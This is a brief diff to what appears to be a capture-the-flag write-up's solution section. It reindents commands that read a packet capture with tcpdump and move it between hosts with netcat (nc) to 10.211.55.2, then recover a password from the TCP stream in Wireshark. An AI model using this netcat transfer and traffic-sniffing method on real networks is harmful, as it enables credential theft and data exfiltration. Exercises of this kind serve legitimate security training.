@@ -17,9 +17,10 @@ Solution
 --------
 
 .. code-block:: bash
-   $ tcpdump -qns 0 -X -r capture.pcap
-   $ nc -l 2001 > capture.pcap
-   $ nc 10.211.55.2 2001 < capture.pcap
+
+		$ tcpdump -qns 0 -X -r capture.pcap
+		$ nc -l 2001 > capture.pcap
+		$ nc 10.211.55.2 2001 < capture.pcap
 
 Open wireshark and look Wireshark and go to Analize -> Follow TCP stream, this will give you the password.
       
